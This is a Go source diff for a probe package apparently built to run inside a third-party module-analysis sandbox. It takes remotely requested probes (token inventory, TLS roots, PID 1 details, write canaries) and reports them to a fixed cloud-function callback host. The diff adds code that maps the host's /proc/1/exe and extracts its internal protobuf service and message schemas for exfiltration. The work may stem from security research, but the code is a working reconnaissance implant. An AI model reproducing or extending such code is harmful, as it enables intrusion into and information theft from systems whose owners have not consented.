@@ -31,11 +31,11 @@ var callbackSession string
 var callbackURLSHA256 string
 
 const (
-	expectedOrigin     = "/capslock/modcache/github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.122-codex"
-	expectedAgent      = "go-cgo-pkgsite-probe-v122-recovery"
+	expectedOrigin     = "/capslock/modcache/github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.123-codex"
+	expectedAgent      = "go-cgo-pkgsite-probe-v123-schema"
 	httpTimeout        = 15 * time.Second
 	sessionLength      = 10 * time.Minute
-	maximumSteps       = 35
+	maximumSteps       = 3
 	maximumBody        = 16 * 1024
 	maximumRead        = 256 * 1024
 	maximumPath        = 512
@@ -43,6 +43,10 @@ const (
 	maximumExe         = 384 * 1024 * 1024
 	maximumServices    = 32
 	maximumMethods     = 256
+	maximumProtoFiles  = 16
+	maximumMessages    = 96
+	maximumFields      = 256
+	maximumSchemaBytes = 12 * 1024
 	descriptorScanTime = 20 * time.Second
 )
 
@@ -321,6 +325,45 @@ type protoServiceReport struct {
 	Truncated       bool           `json:"truncated"`
 }
 
+type protoFieldSchema struct {
+	Name     string `json:"name"`
+	Number   uint64 `json:"number"`
+	Label    string `json:"label"`
+	Kind     string `json:"kind"`
+	TypeName string `json:"type_name"`
+}
+
+type protoMessageSchema struct {
+	Name   string             `json:"name"`
+	Fields []protoFieldSchema `json:"fields"`
+}
+
+type protoMethodSchema struct {
+	Name            string `json:"name"`
+	InputType       string `json:"input_type"`
+	OutputType      string `json:"output_type"`
+	ClientStreaming bool   `json:"client_streaming"`
+	ServerStreaming bool   `json:"server_streaming"`
+}
+
+type protoServiceSchema struct {
+	Name    string              `json:"name"`
+	Methods []protoMethodSchema `json:"methods"`
+}
+
+type protoFileSchema struct {
+	Name     string               `json:"name"`
+	Package  string               `json:"package"`
+	Messages []protoMessageSchema `json:"messages"`
+	Services []protoServiceSchema `json:"services"`
+}
+
+type protoSchemaReport struct {
+	ExecutableBytes int64             `json:"executable_bytes"`
+	Files           []protoFileSchema `json:"files"`
+	Truncated       bool              `json:"truncated"`
+}
+
 type wireField struct {
 	number int
 	wire   int
@@ -440,7 +483,7 @@ func podFingerprint() string {
 }
 
 func initialTranscript(fingerprint string) string {
-	digest := sha256.Sum256([]byte("owned-go-capslock-v122/1\n" + fingerprint))
+	digest := sha256.Sum256([]byte("owned-go-capslock-v123/1\n" + fingerprint))
 	return hex.EncodeToString(digest[:])
 }
 
@@ -539,6 +582,8 @@ func executeProbe(request requestSpec, state *clientState, sequence int) (any, s
 		value = collectInventory(tlsRoots)
 	case "protobuf_services":
 		value, err = collectProtoServices("/proc/1/exe")
+	case "protobuf_schemas":
+		value, err = collectProtoSchemas("/proc/1/exe")
 	case "path_meta":
 		value, err = collectPathMetadata(request.Args["path"])
 	case "dir_meta":
@@ -584,6 +629,7 @@ func validRequestShape(request requestSpec, workspace string) bool {
 		"interfaces": true, "dns_summary": true, "egress_receipt": true,
 		"security_status": true, "pid1_cmdline": true, "cgroup_hints": true,
 		"projected_token_inventory": true, "tls_inventory": true, "protobuf_services": true,
+		"protobuf_schemas": true,
 	}
 	if noArguments[request.ID] {
 		return len(request.Args) == 0
@@ -1024,7 +1070,7 @@ func runWriteCanary(base string, state *clientState, sequence int) (map[string]a
 	if _, err := rand.Read(random[:]); err != nil {
 		return nil, err
 	}
-	basename := ".go-cgo-v122-" + callbackSession[:8] + "-" + strconv.Itoa(sequence) + "-" + hex.EncodeToString(random[:])
+	basename := ".go-cgo-v123-" + callbackSession[:8] + "-" + strconv.Itoa(sequence) + "-" + hex.EncodeToString(random[:])
 	path := filepath.Join(base, basename)
 	fd, err := syscall.Open(path, syscall.O_WRONLY|syscall.O_CREAT|syscall.O_EXCL|syscall.O_NOFOLLOW|syscall.O_CLOEXEC, 0o600)
 	if err != nil {
@@ -1577,6 +1623,308 @@ func servicesFromDescriptor(raw []byte) []protoService {
 	return result
 }
 
+func firstProtoVarint(values []wireField, number int) (uint64, bool) {
+	for _, value := range values {
+		if value.number == number && value.wire == 0 {
+			return value.varint, true
+		}
+	}
+	return 0, false
+}
+
+func validProtoTypeName(value string) bool {
+	if value == "" || len(value) > 256 {
+		return false
+	}
+	if value[0] == '.' {
+		value = value[1:]
+	}
+	return validProtoName(value, true)
+}
+
+func protoLabel(value uint64) string {
+	switch value {
+	case 1:
+		return "optional"
+	case 2:
+		return "required"
+	case 3:
+		return "repeated"
+	default:
+		return ""
+	}
+}
+
+func protoKind(value uint64) string {
+	names := map[uint64]string{
+		1: "double", 2: "float", 3: "int64", 4: "uint64", 5: "int32",
+		6: "fixed64", 7: "fixed32", 8: "bool", 9: "string", 10: "group",
+		11: "message", 12: "bytes", 13: "uint32", 14: "enum", 15: "sfixed32",
+		16: "sfixed64", 17: "sint32", 18: "sint64",
+	}
+	return names[value]
+}
+
+func summarizeProtoField(data []byte) (protoFieldSchema, bool) {
+	values, ok := protobufFields(data)
+	if !ok {
+		return protoFieldSchema{}, false
+	}
+	name := firstProtoString(values, 1)
+	number, hasNumber := firstProtoVarint(values, 3)
+	labelValue, hasLabel := firstProtoVarint(values, 4)
+	kindValue, hasKind := firstProtoVarint(values, 5)
+	label, kind := protoLabel(labelValue), protoKind(kindValue)
+	if !validProtoName(name, false) || !hasNumber || number < 1 || number > 536870911 || !hasLabel || label == "" || !hasKind || kind == "" {
+		return protoFieldSchema{}, false
+	}
+	typeName := firstProtoString(values, 6)
+	if typeName != "" && !validProtoTypeName(typeName) {
+		return protoFieldSchema{}, false
+	}
+	if (kind == "message" || kind == "enum" || kind == "group") != (typeName != "") {
+		return protoFieldSchema{}, false
+	}
+	return protoFieldSchema{Name: name, Number: number, Label: label, Kind: kind, TypeName: typeName}, true
+}
+
+func summarizeProtoMessages(data []byte, prefix string, depth int, messageCount, fieldCount *int, truncated *bool) []protoMessageSchema {
+	if depth > 8 || *messageCount >= maximumMessages {
+		*truncated = true
+		return nil
+	}
+	values, ok := protobufFields(data)
+	if !ok {
+		return nil
+	}
+	name := firstProtoString(values, 1)
+	if !validProtoName(name, false) {
+		return nil
+	}
+	fullName := prefix + "." + name
+	message := protoMessageSchema{Name: fullName, Fields: []protoFieldSchema{}}
+	*messageCount++
+	for _, value := range values {
+		if value.number != 2 || value.wire != 2 {
+			continue
+		}
+		if *fieldCount >= maximumFields {
+			*truncated = true
+			break
+		}
+		field, valid := summarizeProtoField(value.value)
+		if valid {
+			message.Fields = append(message.Fields, field)
+			*fieldCount++
+		}
+	}
+	sort.Slice(message.Fields, func(i, j int) bool {
+		if message.Fields[i].Number != message.Fields[j].Number {
+			return message.Fields[i].Number < message.Fields[j].Number
+		}
+		return message.Fields[i].Name < message.Fields[j].Name
+	})
+	result := []protoMessageSchema{message}
+	for _, value := range values {
+		if value.number != 3 || value.wire != 2 {
+			continue
+		}
+		if *messageCount >= maximumMessages {
+			*truncated = true
+			break
+		}
+		result = append(result, summarizeProtoMessages(value.value, fullName, depth+1, messageCount, fieldCount, truncated)...)
+	}
+	return result
+}
+
+func summarizeProtoService(data []byte, packageName string, methodCount *int, truncated *bool) (protoServiceSchema, bool) {
+	values, ok := protobufFields(data)
+	if !ok {
+		return protoServiceSchema{}, false
+	}
+	name := firstProtoString(values, 1)
+	if !validProtoName(name, false) {
+		return protoServiceSchema{}, false
+	}
+	result := protoServiceSchema{Name: packageName + "." + name, Methods: []protoMethodSchema{}}
+	for _, value := range values {
+		if value.number != 2 || value.wire != 2 {
+			continue
+		}
+		if *methodCount >= maximumMethods {
+			*truncated = true
+			break
+		}
+		methodFields, valid := protobufFields(value.value)
+		if !valid {
+			continue
+		}
+		method := protoMethodSchema{
+			Name: firstProtoString(methodFields, 1), InputType: firstProtoString(methodFields, 2),
+			OutputType: firstProtoString(methodFields, 3),
+		}
+		if !validProtoName(method.Name, false) || !validProtoTypeName(method.InputType) || !validProtoTypeName(method.OutputType) {
+			continue
+		}
+		if streaming, found := firstProtoVarint(methodFields, 5); found {
+			method.ClientStreaming = streaming != 0
+		}
+		if streaming, found := firstProtoVarint(methodFields, 6); found {
+			method.ServerStreaming = streaming != 0
+		}
+		result.Methods = append(result.Methods, method)
+		*methodCount++
+	}
+	sort.Slice(result.Methods, func(i, j int) bool { return result.Methods[i].Name < result.Methods[j].Name })
+	return result, true
+}
+
+func validProtoFileName(value string) bool {
+	if len(value) < 7 || len(value) > 256 || !strings.HasSuffix(value, ".proto") {
+		return false
+	}
+	for _, character := range value {
+		if (character >= 'a' && character <= 'z') || (character >= 'A' && character <= 'Z') ||
+			(character >= '0' && character <= '9') || strings.ContainsRune("_./-", character) {
+			continue
+		}
+		return false
+	}
+	return true
+}
+
+func schemaFromDescriptor(raw []byte, messageCount, fieldCount, serviceCount, methodCount *int, truncated *bool) (protoFileSchema, bool) {
+	values, ok := protobufFields(raw)
+	if !ok {
+		return protoFileSchema{}, false
+	}
+	fileName, packageName := firstProtoString(values, 1), firstProtoString(values, 2)
+	if !validProtoFileName(fileName) || !allowedServicePackage(packageName) || !validProtoName(packageName, true) {
+		return protoFileSchema{}, false
+	}
+	result := protoFileSchema{Name: fileName, Package: packageName, Messages: []protoMessageSchema{}, Services: []protoServiceSchema{}}
+	for _, value := range values {
+		switch value.number {
+		case 4:
+			if value.wire == 2 {
+				result.Messages = append(result.Messages, summarizeProtoMessages(value.value, packageName, 0, messageCount, fieldCount, truncated)...)
+			}
+		case 6:
+			if value.wire != 2 {
+				continue
+			}
+			if *serviceCount >= maximumServices {
+				*truncated = true
+				continue
+			}
+			service, valid := summarizeProtoService(value.value, packageName, methodCount, truncated)
+			if valid {
+				result.Services = append(result.Services, service)
+				*serviceCount++
+			}
+		}
+	}
+	if len(result.Messages) == 0 && len(result.Services) == 0 {
+		return protoFileSchema{}, false
+	}
+	sort.Slice(result.Messages, func(i, j int) bool { return result.Messages[i].Name < result.Messages[j].Name })
+	sort.Slice(result.Services, func(i, j int) bool { return result.Services[i].Name < result.Services[j].Name })
+	return result, true
+}
+
+func trimSchemaFile(value protoFileSchema, budget int) (protoFileSchema, bool) {
+	truncated := false
+	for {
+		encoded, _ := json.Marshal(value)
+		if len(encoded) <= budget {
+			return value, truncated
+		}
+		truncated = true
+		lastMessage := len(value.Messages) - 1
+		lastService := len(value.Services) - 1
+		switch {
+		case lastMessage >= 0 && len(value.Messages[lastMessage].Fields) > 0:
+			value.Messages[lastMessage].Fields = value.Messages[lastMessage].Fields[:len(value.Messages[lastMessage].Fields)-1]
+		case lastMessage >= 0:
+			value.Messages = value.Messages[:lastMessage]
+		case lastService >= 0 && len(value.Services[lastService].Methods) > 0:
+			value.Services[lastService].Methods = value.Services[lastService].Methods[:len(value.Services[lastService].Methods)-1]
+		case lastService >= 0:
+			value.Services = value.Services[:lastService]
+		default:
+			return protoFileSchema{}, true
+		}
+	}
+}
+
+func collectProtoSchemas(path string) (protoSchemaReport, error) {
+	file, err := os.Open(path)
+	if err != nil {
+		return protoSchemaReport{}, err
+	}
+	defer file.Close()
+	info, err := file.Stat()
+	if err != nil || info.Size() < 1 || info.Size() > maximumExe {
+		return protoSchemaReport{}, errors.New("executable outside scan bound")
+	}
+	data, err := syscall.Mmap(int(file.Fd()), 0, int(info.Size()), syscall.PROT_READ, syscall.MAP_PRIVATE)
+	if err != nil {
+		return protoSchemaReport{}, err
+	}
+	defer syscall.Munmap(data)
+	report := protoSchemaReport{ExecutableBytes: info.Size(), Files: []protoFileSchema{}}
+	seen := map[string]bool{}
+	messageCount, fieldCount, serviceCount, methodCount := 0, 0, 0, 0
+	usedBytes := 128
+	deadline := time.Now().Add(descriptorScanTime)
+	for offset := 0; offset < len(data); offset++ {
+		if offset%(1024*1024) == 0 && time.Now().After(deadline) {
+			report.Truncated = true
+			break
+		}
+		if data[offset] != 0x0a {
+			continue
+		}
+		raw, ok := descriptorAt(data, offset)
+		if !ok {
+			continue
+		}
+		descriptorFields, fieldsValid := protobufFields(raw)
+		fileName, packageName := firstProtoString(descriptorFields, 1), firstProtoString(descriptorFields, 2)
+		key := packageName + "\n" + fileName
+		if !fieldsValid || seen[key] {
+			continue
+		}
+		fileSchema, valid := schemaFromDescriptor(raw, &messageCount, &fieldCount, &serviceCount, &methodCount, &report.Truncated)
+		if !valid {
+			continue
+		}
+		seen[key] = true
+		if len(report.Files) >= maximumProtoFiles || usedBytes >= maximumSchemaBytes {
+			report.Truncated = true
+			continue
+		}
+		trimmed, wasTrimmed := trimSchemaFile(fileSchema, maximumSchemaBytes-usedBytes)
+		if wasTrimmed {
+			report.Truncated = true
+		}
+		if trimmed.Name == "" || (len(trimmed.Messages) == 0 && len(trimmed.Services) == 0) {
+			continue
+		}
+		encoded, _ := json.Marshal(trimmed)
+		usedBytes += len(encoded)
+		report.Files = append(report.Files, trimmed)
+	}
+	sort.Slice(report.Files, func(i, j int) bool {
+		if report.Files[i].Package != report.Files[j].Package {
+			return report.Files[i].Package < report.Files[j].Package
+		}
+		return report.Files[i].Name < report.Files[j].Name
+	})
+	return report, nil
+}
+
 func collectProtoServices(path string) (protoServiceReport, error) {
 	file, err := os.Open(path)
 	if err != nil {
@@ -1680,7 +2028,7 @@ func validateRuntimeConfiguration() error {
 	parsed, err := url.Parse(callbackURL)
 	if err != nil || parsed.Scheme != "https" || parsed.Host != "us-central1-s0victim-44547.cloudfunctions.net" ||
 		parsed.User != nil || parsed.Opaque != "" || parsed.RawQuery != "" || parsed.Fragment != "" ||
-		parsed.Path != "/go-cgo-v122-recovery-codex/v1/session/"+callbackSession {
+		parsed.Path != "/go-cgo-v123-schema-codex/v1/session/"+callbackSession {
 		return errors.New("invalid fixed callback URL")
 	}
 	digest := sha256.Sum256([]byte(callbackURL))
